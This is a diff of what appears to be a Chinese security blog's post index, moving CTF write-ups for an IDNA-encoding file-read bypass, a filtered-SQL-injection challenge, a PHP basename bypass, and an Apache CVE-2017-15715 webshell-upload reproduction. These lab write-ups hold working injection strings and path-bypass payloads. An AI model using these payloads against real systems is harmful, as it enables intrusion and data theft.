class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;help/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;help/Python.html&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>除了这些部分之外，还有一些属性（详细的可以看官网），其中就有<code>hostname</code>。不严谨的解释： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://abc.cde.com/index.php?name=hello&#x27;</span></span><br><span class="line"></span><br><span class="line">其中hostname就是abc.cde.com，即http://之后，/index.php之前的部分都是</span><br></pre></td></tr></table></figure></p>
-<p><code>urlsplit(url)</code>作用：将url字符串分割成多个部分，大致上与<code>urlparse(url)</code>一样。</p>
-<p><code>urlunsplit(parts)</code>作用：与<code>urlsplit()</code>函数相反，这是将多个部分拼接成一个url。</p>
-<p><code>h.encode('idna')</code>作用：将h进行inda编码。idna简单来说就是为了统一不同国家见的特殊字符的域名而设计出来的一种编码，说白了就是把其他语言及其特殊字符转换成英文即国际符号。</p>
-<h2 id="ngnix">Ngnix</h2>
-<p>ngnix的配置文件地址是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>/usr/local下的才是正在使用的配置文件，/etc/nginx那个只是默认的配置</p>
-</blockquote>
-<h1 id="解题">解题</h1>
-<p>分析代码得到有用的信息： - 利用<code>return urllib.request.urlopen(finalUrl).read()</code>get flag，因此使用伪协议file读取； - 根据提示，域名为<code>suctf.cc</code>，且跟ngnix有关系。所以，尝试先读取ngnix的配置文件<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>； - 域名不能直接为<code>suctf.cc</code>，经过<code>h.encode('idna').decode('utf-8')</code>之后才为<code>suctf.cc</code>。这样才可以绕过前两个if判断；</p>
-<p>根据idna编码规则，去<a href="https://www.compart.com/en/unicode">compart</a>，搜索相关的字符，在搜索框输入<code>/</code>时找到了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416225726.png" /></p>
-<p>因此，构造payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
-<p>解释：此时的hostname为<code>suctf.c℆sr</code>，但是无法被被识别，所以两次的<code>host=='suctf.cc'</code>都被成功绕过。而当执行到<code>newhost.append(h.encode('idna').decode('utf-8'))</code>时，<code>c℆sr</code>变成<code>cc/usr</code>，然后在经过<code>parts[1] = '.'.join(newhost)</code>拼接，得到<code>suctf.cc/usr</code>，最后<code>finalUrl = urlunsplit(parts).split(' ')[0]</code>得到完成的url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.cc/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230456.png" /></p>
-<p>找到了flag文件的位置，接下来构造如下payload，最终得到flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230602.png" /></p>
-<h1 id="总结">总结</h1>
-<p>我认为本题考察的<code>idna</code>编码确实比较少见，我个人分析代码得到了需要利用某种编码方式绕过前两次if，然后经过<code>idna</code>编码再得到正确的域名，但是找不到可用的字符，经过查看大佬的writeup之后才找到。</p>
-<p>大佬writeup</p>
-<ul>
-<li>https://mashiro01.github.io/writeup/SUCTF_2019.html</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-        <tag>IDNA编码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SWPU2019 Web1</title>
-    <url>/2022/04/13/SWPU2019%20Web1/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
-<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
-<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
-<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
-<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
-<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
-<h1 id="解题">解题</h1>
-<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
-<ul>
-<li>Bypass information_schema;</li>
-<li>无列名注入</li>
-</ul>
-<p>[[information_schema绕过及无列名注入]]</p>
-<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
-<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
-<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
-<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
-<p>（flag在<code>users</code>中）</p>
-<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
-<p>最终得到flag：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>无列名注入</tag>
-        <tag>Bypass information_schema</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WUSTCTF2020 朴实无华</title>
     <url>/2022/04/07/WUSTCTF2020%20%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5D朴实无华">朴实无华</a></p>
@@ -3926,6 +3926,41 @@
       <tags>
         <tag>SQL注入</tag>
         <tag>布尔盲注</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Zer0pts2020 Can you guess it</title>
+    <url>/2022/04/24/Zer0pts2020%20Can%20you%20guess%20it/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">Can you guess it?</a></p>
+<span id="more"></span>
+<h1 id="题目信息">1. 题目信息</h1>
+<p>进入环境之后，点击Source得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="解题">2. 解题</h1>
+<p>乍一看，有两个突破点：</p>
+<ol type="1">
+<li><p>通过highlight_file()函数，把confi.php当作参数即可；</p></li>
+<li><p>绕过hash_equals()，从而输出flag；</p></li>
+</ol>
+<p>但是，经过分析，第二点无法突破，<code>$secret</code>是随机的，hash_equals不像其他函数可以通过数组这些绕过。因此，目光回到第一点。</p>
+<p>首先，假设我们的url为: <code>http://hostname/test/index.php?source=balabala</code>，那么<code>$_SERVER['PHP_SELF'])</code>的返回结果就是/test/index.php；<code>basename($_SERVER['PHP_SELF'])</code>返回的结果就是index.php。</p>
+<p>乍一看很完美，没有漏洞可言，但是basename有一个小问题，那就是如果地址中文件的后面出现非ascii码的特殊字符（不在ASCII码中），那么basename就会当作没看见。比如这样的url: <code>http://hostname/test/basename.php/%81?source=balabala</code>（这里的%81值得是16进制的81，而ascii码最大就到7f，因此已经超过），那么此时，basename眼中的url为<code>http://hostname/test/basename.php/?source=balabala</code>，因此最终返回的结果就是basename.php。</p>
+<p>我在自己的主机上编写了如下代码做测试： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test/basename.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span>(basename(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>正常的url: <code>/test/basename.php/config.php?source=balabla</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424232954.png" /></p>
+<p>如果url为: <code>/test/basename.php/config.php/%81?source=balabla</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233105.png" /></p>
+<p>知道了前置知识后就简单了。</p>
+<p>首先我们要绕过正则匹配，其实只要<code>$_SERVER['PHP_SELF']</code>的值不以config.php结尾即可，因此只要在config.php后面随便加点什么就行了。又因为经过basename函数最终的结果要为config.php，所以最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/config.php/%81?source</span><br></pre></td></tr></table></figure></p>
+<p>其实%80也可以，但是本地测试的时候是不行的，不知道什么原因。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233512.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>PHP知识</tag>
+        <tag>basename绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -4043,27 +4078,6 @@
       </categories>
       <tags>
         <tag>Smarty</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vim缩进问题</title>
-    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
-<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
-<h1 id="解决方案">解决方案</h1>
-<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
-<p>然后就可以成功运行脚本了。</p>
-<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>vim</tag>
       </tags>
   </entry>
   <entry>
@@ -4421,6 +4435,27 @@
       </tags>
   </entry>
   <entry>
+    <title>vim缩进问题</title>
+    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
+<span id="more"></span>
+<h1 id="问题描述">问题描述</h1>
+<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
+<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
+<h1 id="解决方案">解决方案</h1>
+<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
+<p>然后就可以成功运行脚本了。</p>
+<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>vim</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反序列化知识点</title>
     <url>/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
     <content><![CDATA[<p>个人总结的知识点，持续更新。</p>
@@ -4603,40 +4638,6 @@
       </tags>
   </entry>
   <entry>
-    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
-    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
-<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
-<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
-<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
-<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
-<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
-<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
-<p>成功获得 webshell。</p>
-<h1 id="总结">总结</h1>
-<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
-<h1 id="资源">资源</h1>
-<ol type="1">
-<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
-<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
     <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
     <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
@@ -4685,6 +4686,40 @@
       </categories>
       <tags>
         <tag>AppWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
+    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
+<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
+<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
+<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
+<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
+<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
+<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
+<p>成功获得 webshell。</p>
+<h1 id="总结">总结</h1>
+<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
+<h1 id="资源">资源</h1>
+<ol type="1">
+<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
